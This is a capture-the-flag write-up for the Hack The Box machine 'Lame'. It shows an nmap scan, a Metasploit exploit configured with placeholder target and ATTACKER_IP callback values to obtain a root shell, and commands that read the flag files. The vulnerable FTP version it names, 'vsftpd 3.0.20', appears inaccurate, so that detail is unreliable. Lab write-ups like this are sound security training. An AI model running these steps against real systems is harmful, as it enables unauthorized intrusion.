# HTB - [Lame]

> **Difficulty:** Easy
> **OS:** Linux
> **IP:** `10.129.37.210`

---

## Overview

This machine was compromised through a vulnerable FTP service running **vsftpd 3.0.20**.

The attack path was relatively straightforward:

1. Perform full port and service enumeration.
2. Identify the vulnerable `vsftpd` version.
3. Research known vulnerabilities affecting the service.
4. Exploit the vulnerability using Metasploit.
5. Obtain a shell with root privileges.
6. Retrieve both flags.

---

## Enumeration

### Nmap

I started by performing a full TCP port scan with service and default script detection:

```bash
nmap -sC -sV -p- 10.129.37.210
```

The scan revealed several exposed services:

```text
21/tcp    ftp
22/tcp    ssh
139/tcp   netbios-ssn
445/tcp   microsoft-ds
3632/tcp  distccd
```

The most interesting service was FTP, which was running:

```text
vsftpd 3.0.20
```

Since the service version was clearly identified, I researched known vulnerabilities affecting this release.

---

## Initial Access

### Vulnerability Research

After identifying the FTP service and its version, I searched for known vulnerabilities related to `vsftpd 3.0.20`.

The version was associated with a known remote code execution vulnerability, and a corresponding exploit was available through the Metasploit Framework.

I searched for available modules using:

```text
search vsftpd
```

After identifying the relevant exploit, I selected it and configured the target and callback parameters.

---

### Exploitation with Metasploit

The exploit was configured with the target IP address and my attacking machine's IP address:

```text
use <exploit>
set RHOSTS <TARGET_IP>
set LHOST <ATTACKER_IP>
run
```

After executing the exploit, I successfully obtained a shell on the target machine.

---

## Root Access

The shell obtained through the exploit already had root privileges.

<img width="959" height="163" alt="root-lame" src="https://github.com/user-attachments/assets/73e81f28-ceff-4973-a97e-5babe13724cf" />


I verified the current user with:

```bash
whoami
```

The output was:

```text
root
```

Therefore, no additional privilege escalation was necessary.

This was an important reminder to always check the current privilege level immediately after obtaining a shell. Not every machine requires a separate privilege escalation phase.

---

## Flags

After obtaining root access, I retrieved both flags.

### User Flag

```bash
cat /home/<user>/user.txt
```

### Root Flag

```bash
cat /root/root.txt
```

The flags can be added here if desired.

---

## Attack Path Summary

```text
Full Port Scan
      │
      ▼
Service Enumeration
      │
      ▼
vsftpd 3.0.20 Identified
      │
      ▼
Vulnerability Research
      │
      ▼
Metasploit Exploitation
      │
      ▼
Root Shell
      │
      ▼
User + Root Flags
```

---

## Lessons Learned

* Always perform full port enumeration when possible.
* Service version enumeration can immediately reveal potential attack vectors.
* Known vulnerable versions should always be researched after identification.
* Metasploit can be useful for quickly validating and exploiting known vulnerabilities in authorized environments.
* Always run `whoami` immediately after obtaining a shell.
* Do not assume that privilege escalation is required. The initial exploit may already provide elevated privileges.
* The simplest attack path is often the correct one, so it is important not to overcomplicate the process unnecessarily.

---

## Tools Used

* Nmap
* Metasploit Framework
* FTP enumeration
* Linux shell

---

## Methodology

```text
Enumeration
    ↓
Service Version Identification
    ↓
Vulnerability Research
    ↓
Exploit Selection
    ↓
Metasploit Exploitation
    ↓
Root Shell
    ↓
Flag Retrieval
```
